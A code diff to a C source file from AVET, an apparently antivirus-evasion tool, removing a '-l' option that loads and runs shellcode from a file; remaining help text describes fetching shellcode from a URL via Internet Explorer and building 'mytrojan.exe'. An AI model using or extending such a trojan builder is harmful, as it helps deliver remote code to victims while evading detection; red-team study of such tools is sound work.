@@ -13,14 +13,11 @@ Web: https://github.com/govolution/avet
  
 void print_start();
 void print_help();
-int print_debug;
-int load_from_file;
 
 int main (int argc, char **argv)
 {
 	print_start();
-
-	load_from_file = 0;
+	
 	char *evalue = NULL;
 	char *uvalue = NULL;
 	char *wvalue = NULL;
@@ -42,10 +39,7 @@ int main (int argc, char **argv)
 				break;
 			case 'e':
 				evalue = optarg;
-				break;
-			case 'l':
-				load_from_file = 1;
-				break;
+				break;			
 			case 'u':
 				uvalue = optarg;
 				break;
@@ -78,22 +72,7 @@ int main (int argc, char **argv)
 
 	// print help
 	if (hflag)
-		print_help();
-	else if (load_from_file)
-	{
-		//write LVALUE to defs.h
-		FILE *file_def;
-		file_def = fopen ("defs.h","w");
-
-		if (file_def == NULL)
-		{
-			printf ("Error open defs.h\n");
-			return -1;
-		}
-
-		fprintf (file_def, "#define LVALUE\n");
-		fclose(file_def);
-	}
+		print_help();	
 	
 	// exec from url
 	else if (uvalue)
@@ -144,8 +123,7 @@ int main (int argc, char **argv)
 
 void print_help()
 {
-	printf("Options:\n");
-	printf("-l load and exec shellcode from given file, call is with mytrojan.exe myshellcode.bin\n");
+	printf("Options:\n");	
 	printf("   when called with -E call with mytrojan.exe shellcode.txt\n");
 	printf("-u load and exec shellcode from url using internet explorer (url is compiled into executable)\n");
 	printf("-d download the shellcode file using different techniques\n");
